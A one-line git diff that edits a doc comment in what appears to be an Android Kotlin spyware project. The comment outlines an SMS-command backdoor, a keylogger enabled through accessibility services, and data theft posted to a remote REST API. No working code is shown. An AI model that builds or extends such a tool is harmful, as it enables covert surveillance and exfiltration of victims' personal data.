@@ -73,7 +73,7 @@ import kotlinx.coroutines.runBlocking
 *  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe] method
 *  of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for fetching
 *  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
-*  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine].
+*  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine] for transmitting HTTP requests.
 * */
 @KtorExperimentalAPI
 class MainActivity : AppCompatActivity() {
